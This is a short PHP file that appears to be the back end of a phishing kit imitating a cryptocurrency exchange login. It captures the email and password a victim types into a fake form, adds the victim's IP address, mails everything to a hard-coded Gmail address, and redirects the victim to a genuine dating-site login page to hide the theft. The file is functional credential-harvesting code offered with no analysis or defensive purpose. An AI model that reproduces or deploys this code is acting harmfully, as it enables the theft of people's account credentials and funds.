<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || coinbxe log GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="thomasforeveryoung19@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com/v3/login?CPSessionID=3283d11a-41fa-442d-96f8-1ae91311624a&VisitorID=33753761995");
?>